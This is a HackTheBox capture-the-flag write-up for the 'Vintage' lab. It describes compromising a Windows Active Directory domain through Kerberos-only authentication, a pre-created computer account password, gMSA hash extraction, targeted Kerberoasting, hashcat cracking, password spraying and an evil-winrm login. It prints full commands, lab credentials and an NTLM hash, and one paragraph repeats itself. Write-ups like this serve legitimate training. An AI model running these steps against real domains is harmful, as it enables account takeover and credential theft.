# HackTheBox Writeup: Vintage

**Difficoltà:** Hard
**OS:** Windows
**Date:** 02/04/2026

## 1. Information Gathering & Reconnaissance
IP target: 10.129.231.205
Credentials: P.Rosa:Rosaisbest123

### 1.1 Port Scanning

The assessment began with a comprehensive network port scan using Nmap to identify exposed services and map the target's attack surface. We utilized the **-sC** flag for default enumeration scripts and **-sV** for service version detection.

```sudo nmap -sC -sV -oA nmap/vintage 10.129.231.205```

<img width="1003" height="533" alt="image" src="https://github.com/user-attachments/assets/1982cffe-79f1-42c9-9fd7-2d94eb9f506c" />

The scan revealed a standard Active Directory environment (DNS, Kerberos, SMB, LDAP). Notably, LDAPS (port 636) was TCP-wrapped, meaning it strictly enforced SSL client certificates for connections. Based on the exposed services, we updated our local **/etc/hosts** file to resolve **vintage.htb** and **dc01.vintage.htb** to the target IP, which is a strict requirement for Kerberos authentication.

## 2. Enumeration & Initial Access

### 2.1 SMB & Authentication Mechanisms

Initial attempts to authenticate using the provided credentials via standard NTLM protocols failed. It was determined that **NTLM authentication is completely disabled** on this domain. Consequently, all authentication attempts had to be routed through Kerberos.
Kerberos is highly sensitive to hostname resolution, therefore, we targeted the Fully Qualified Domain Name (FQDN) rather than the IP address, passing the **-k** flag to NetExec (NXC) to force Kerberos authentication.

```nxc smb dc01.vintage.htb -u P.Rosa -p 'Rosaisbest123' -k```

<img width="1116" height="65" alt="image" src="https://github.com/user-attachments/assets/23c4cd69-4928-4dce-83f3-82080d60206a" />

We then verified our access and enumerated domain users:

```nxc smb dc01.vintage.htb -u P.Rosa -p 'Rosaisbest123'  -k --users ```

<img width="1356" height="317" alt="image" src="https://github.com/user-attachments/assets/79c4a9f1-7b8e-4c4a-bcbb-ac1160c57fd4" />

### 2.2 Active Directory ACL Enumeration (BloodHound)

To silently map the domain's permission architecture, we ingested the Active Directory data into BloodHound.
Analysis of the attack paths revealed a potential Resource-Based Constrained Delegation (RBCD) vector. Specifically, users like **L. Bianchi** and ** C.Neri** hold the right to add themselves to the **DELEGATEDADMINS** group.
This group is critical because it holds the **AllowedToAct** privilege over the Domain Controller (**DC01**), which could eventually allow for domain compromise.

``` rusthound-ce -d vintage.htb -u P.Rosa -p 'Rosaisbest123' ```

<img width="1206" height="356" alt="image" src="https://github.com/user-attachments/assets/01959115-fe53-4c44-ad18-c7d394680b7c" />

They can then use the AllowedToAct privilege to become DC administrators.
<img width="971" height="347" alt="image" src="https://github.com/user-attachments/assets/f0e49c1f-013b-4c36-9a6c-58ce10823443" />

### 2.3 Offline Password Trend Analysis

Instead of generating noisy queries against the Domain Controller, we analyzed the raw JSON data dumped by BloodHound to identify potential password spraying targets. Using jq, we correlated user accounts with their **pwdlastset** (Last Password Set) timestamp:

```cat 20260402090810_vintage-htb_users.json | jq '.data[].Properties | select(.samaccountname) | "\(.pwdlastset):\(.samaccountname)"' -r | sort -n ```


<img width="1217" height="273" alt="image" src="https://github.com/user-attachments/assets/ca01f6a4-1958-4052-9866-c221527a7191" />

The output revealed that multiple users and service accounts had their passwords set at the exact same millisecond. This strongly indicates the use of an automated provisioning script, which often assigns identical default passwords to bulk-created accounts, presenting a high risk of password reuse.
But the most important thing is this service account: **gMSA01$** 

<img width="737" height="216" alt="image" src="https://github.com/user-attachments/assets/a82ea4ba-4da0-4908-be34-bffcc1a15625" />

## 3. Exploitation & Lateral Movement

### 3.1 Pre-Windows 2000 Compatible Access Vulnerability

During our BloodHound analysis, we identified a Group Managed Service Account named **gMSA01$**.

We discovered that the **DOMAIN COMPUTERS** group has **ReadGMSAPassword** rights over this account. Further inspection revealed that the machine account **FS01$** is a member of the **Pre-Windows 2000 Compatible Access group**.

**Vulnerability Insight:** Due to a legacy Active Directory configuration, when a computer account is pre-created and placed in the "Pre-Windows 2000 Compatible Access" group, its default password is automatically set to the computer's name in lowercase. **(Reference: TrustedSec - Diving into Pre-created Computer Accounts)**.

`https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts`

<img width="782" height="115" alt="image" src="https://github.com/user-attachments/assets/4ab6d1f2-8f06-4025-a7ac-e4f2b42348e4" />

We successfully authenticated as the machine account using this logic:

`nxc smb dc01.vintage.htb -k -u 'fs01$' -p fs01`

<img width="1107" height="57" alt="image" src="https://github.com/user-attachments/assets/bac1b3ce-b994-4d47-a683-c8cef15ad9b3" />

### 3.2 GMSA Hash Extraction

`nxc ldap dc01.vintage.htb -k -u 'fs01$' -p fs01 --gmsa`

### 3.3 Targeted Kerberoasting
BloodHound indicated that **gMSA01$** has the right to add itself to the **ServiceManagers** group. We executed this action using the newly acquired NTLM hash:

` bloodyAD -d vintage.htb -u 'gmsa01$' -p '0851299c01b944d01099fc977eaa6c67' -f rc4 --host dc01.vintage.htb -k add groupMember ServiceManagers 'gmsa01$' `

The **ServiceManagers** group possesses The ServiceManagers group possesses GenericAll (full control) over three service accounts (**svc_sql**, **svc_ark**, **svc_ldap**). Although these accounts did not natively have a Service Principal Name (SPN)—making them immune to standard Kerberoasting—our **GenericAll** permissions allowed us to perform a Targeted Kerberoasting attack. This technique involves manually assigning a dummy SPN to the accounts, requesting the Kerberos TGS ticket (which contains the crackable password hash), and subsequently removing the SPN. (full control) over three service accounts (svc_sql, svc_ark, svc_ldap). Although these accounts did not natively have a ServicePrincipalName (SPN) making them immune to standard Kerberoasting our GenericAll permissions allowed us to perform a Targeted Kerberoasting attack. This technique involves manually assigning a dummy SPN to the accounts, requesting the Kerberos TGS ticket (which contains the crackable password hash), and subsequently removing the SPN.

<img width="1114" height="398" alt="image" src="https://github.com/user-attachments/assets/850cfa72-184c-4eba-964d-53f24764b3e5" />


`getTGT.py 'vintage.htb/gmsa01$' -dc-ip 10.129.231.205 -hashes :0851299c01b944d01099fc977eaa6c67 `


<img width="809" height="77" alt="image" src="https://github.com/user-attachments/assets/05959753-0f01-4e49-9d73-765fcc01d916" />

`KRB5CCNAME=gmsa01$.ccache python3 targetedKerberoast.py -d vintage.htb -k --no-pass --dc-host dc01.vintage.htb --request-user svc_ark`

<img width="1118" height="61" alt="image" src="https://github.com/user-attachments/assets/4dbbf6ca-3f6e-4da4-8a8d-e70227941f93" />
Let's reactivate the LDAP service account
`KRB5CCNAME=gmsa01$.ccache python3 targetedKerberoast.py -d vintage.htb -k --no-pass --dc-host dc01.vintage.htb`

<img width="1909" height="383" alt="image" src="https://github.com/user-attachments/assets/71eb6824-99f2-476a-b79f-6e8699cfc591" />
remove the uac
`bloodyAD -d vintage.htb -u 'gmsa01$' -p '0851299c01b944d01099fc977eaa6c67' -f rc4 --host dc01.vintage.htb -k remove uac svc_sql -f ACCOUNTDISABLE`

<img width="1241" height="61" alt="image" src="https://github.com/user-attachments/assets/09a28c77-bc02-4a84-9b56-805c551e8cb1" />

Now we get three hashes

` KRB5CCNAME=gmsa01$.ccache python3 targetedKerberoast.py -d vintage.htb -k --no-pass --dc-host dc01.vintage.htb`

<img width="1905" height="593" alt="image" src="https://github.com/user-attachments/assets/d38cc787-8d49-4052-a9a3-ed8e3cb9aa2a" />

`bloodyAD -d vintage.htb -u 'gmsa01$' -p '0851299c01b944d01099fc977eaa6c67' -f rc4 --host dc01.vintage.htb -k set object svc_sql servicePrincipalName -v 'hhttp/sql'`

<img width="1355" height="43" alt="image" src="https://github.com/user-attachments/assets/0f4e9899-8916-4c68-8354-90ca2a6f247a" />

`bloodyAD -d vintage.htb -u 'gmsa01$' -p '0851299c01b944d01099fc977eaa6c67' -f rc4 --host dc01.vintage.htb -k set object svc_ark servicePrincipalName -v 'http/ark'`

<img width="1351" height="52" alt="image" src="https://github.com/user-attachments/assets/c0f98dd0-fa25-4ae3-bdb0-597e0a35f322" />


`bloodyAD -d vintage.htb -u 'gmsa01$' -p '0851299c01b944d01099fc977eaa6c67' -f rc4 --host dc01.vintage.htb -k set object svc_ldap servicePrincipalName -v 'http/ldap'`

<img width="1353" height="43" alt="image" src="https://github.com/user-attachments/assets/668e1a3a-3e66-4cd3-826d-af2e452e0af5" />

`nxc ldap dc01.vintage.htb -k -u 'gmsa01$' -H 0851299c01b944d01099fc977eaa6c67 -k --kerberoasting nxc.hashes`

<img width="1904" height="619" alt="image" src="https://github.com/user-attachments/assets/00731e59-5abb-43ce-aa4e-6647d3f7fae8" />

crack the hash:

`hashcat -m 13100 hashes /usr/share/wordlists/rockyou.txt --force`

<img width="1896" height="162" alt="image" src="https://github.com/user-attachments/assets/c32b7e34-e188-4a59-ae22-bbaa8efd91c5" />

We find that the c.neri account can log in using the password we discovered, and using Bloodhound, we see that it is in the “REMOTE MANAGEMENT USERS@VINTAGE.HTB” group.

<img width="1238" height="301" alt="image" src="https://github.com/user-attachments/assets/a1a1453a-a699-45da-9c76-af7d0bf25bd0" />

`nxc ldap dc01.vintage.htb -k -u users.txt -p Zer0the0ne -k --continue-on-success`

<img width="978" height="393" alt="image" src="https://github.com/user-attachments/assets/7dbb2091-caa6-4a5a-ad2b-9eb8adc8d0ae" />

Let's generate the file to communicate with the DC

` nxc smb dc01.vintage.htb -u c.neri -p Zer0the0ne --generate-krb5-file vintage.krb5 `

<img width="1091" height="86" alt="image" src="https://github.com/user-attachments/assets/901616a0-317e-4994-b69a-ea293e6aeb25" />

We are requesting the TGT ticker for C. Neri

`getTGT.py vintage.htb/c.neri:Zer0the0ne -dc-ip 10.129.231.205`

We're in

`KRB5CCNAME=c.neri.ccache evil-winrm -i dc01.vintage.htb -r vintage.htb `



